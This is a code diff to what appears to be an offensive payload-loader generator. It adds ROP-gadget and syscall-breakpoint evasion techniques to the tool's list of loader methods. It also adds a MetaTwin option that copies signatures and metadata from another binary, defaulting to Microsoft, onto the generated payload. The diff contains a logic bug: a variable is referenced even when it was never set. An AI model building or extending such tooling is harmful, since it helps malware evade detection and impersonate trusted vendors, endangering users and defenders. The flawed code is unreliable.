@@ -1015,6 +1015,9 @@ def main():
     48. Stealth new loader + Syscall breakpoints handler with memory guard AKA Sifu breakpoint handler (hook on NtResumeThread)
     49. Stealth new loader + Syscall breakpoints handler with memory guard evasion AKA Sifu breakpoint handler (hook on NtCreateThreadEx, with Decoy address, PAGE_NOACCESS and XOR)
     51. Stealth new loader + Syscall breakpoints handler with memory guard evasion AKA Sifu breakpoint handler (hook on ntdll!RtlUserThreadStart and kernel32!BaseThreadInitThunk, with Decoy address, PAGE_NOACCESS and XOR)
+    52. RoP gadgets as the trampoline code to execute the magic code. 
+    53.
+    54. Stealth new loader + Exception handler + Syscall breakpoints handler with memory guard evasion AKA Sifu breakpoint handler (hook on ntdll!RtlUserThreadStart and kernel32!BaseThreadInitThunk, with Decoy address, PAGE_NOACCESS and XOR)
     """
 
     def check_non_negative(value):
@@ -1083,7 +1086,7 @@ def main():
     parser.add_argument('-wm', '--watermark', type=int, nargs='?', const=1, default=1, help='Add watermark to the binary (0 for False, 1 or no value for True)')
 
     parser.add_argument('-s', '--sign-certificate', nargs='?', const='ask_user', 
-                        help='Optional: Sign the payload. If a website or filepath is provided, use it. Defaults to interactive mode if no argument is provided.')
+                        help='Optional: Sign the output binary and copy metadata from another binary to your output. If a website or filepath is provided, use it. Defaults to interactive mode if no argument is provided.')
 
 
     args = parser.parse_args()
@@ -1230,6 +1233,11 @@ def main():
     def sign_with_mangle(file_path, output_file_path, signed_output_file_path):
         mangle_command = f"./signature/Mangle -C {file_path} -I {output_file_path} -O {signed_output_file_path} -M"
         subprocess.run(mangle_command, shell=True, check=True)
+    
+    def sign_with_metatwin(meta_source_file, output_file_path):
+        ## metatwin command is: "python3 metatwin.py ../Bob-and-Alice/signature/Desktops.exe  ../Bob-and-Alice/alice_notepad.exe"
+        metatwin_command = f"python3 signature/metatwin.py {meta_source_file} {output_file_path}"
+        subprocess.run(metatwin_command, shell=True, check=True)
 
     if args.sign_certificate:
         signed_output_file_path = "signed_" + os.path.basename(output_file_path)
@@ -1248,7 +1256,7 @@ def main():
 
         # Handle user interactions for certificate signing
         if args.sign_certificate == 'ask_user':
-            response = input("Choose the signing method - Vendor (2) or Program (1): ").strip()
+            response = input("Choose the signing method - Vendor (2) or Mangle (1) or MetaTwin (0): ").strip()
             if response == '2':
                 vendor_name = input("Enter the vendor website or press enter for default (www.microsoft.com): ").strip()
                 vendor_name = vendor_name if vendor_name else 'www.microsoft.com'
@@ -1257,15 +1265,25 @@ def main():
                 program_path = input("Enter the program path or press enter for default (./signature/Desktops.exe): ").strip()
                 program_path = program_path if program_path else './signature/Desktops.exe'
                 sign_with_mangle(program_path, output_file_path, signed_output_file_path)
+            elif response == '0':
+                meta_source_file = input("Enter the source file path or press enter for default (./signature/Desktops.exe): ").strip()
+                meta_source_file = meta_source_file if meta_source_file else './signature/Desktops.exe'
+                sign_with_metatwin(meta_source_file, output_file_path)
+
             else:
                 print("Invalid option. Exiting.")
                 exit()
         elif os.path.isfile(args.sign_certificate):
-            sign_with_mangle(args.sign_certificate, output_file_path, signed_output_file_path)
+            # sign_with_mangle(args.sign_certificate, output_file_path, signed_output_file_path)
+            sign_with_metatwin(args.sign_certificate, output_file_path)
+            # add signed_res_ to original binary name.
         else:
             sign_with_carbon_copy(args.sign_certificate, output_file_path, signed_output_file_path)
+        ## if we use response 0, our signed output binary will be signed_res_ added to the original output file name, we ned to reflect that:
+        if response == '0':
+            signed_output_file_path = "signed_res_" + os.path.basename(output_file_path)
         print(f"\033[95m [+] Signed binary generated \033[0m: \033[92m{signed_output_file_path}\033[0m")
-            
+        
 
     ## calculate the final output file hash in red colour:
     print(f"[+] Final output file hash: \033[91m{hashlib.md5(open(output_file_path, 'rb').read()).hexdigest()}\033[0m")
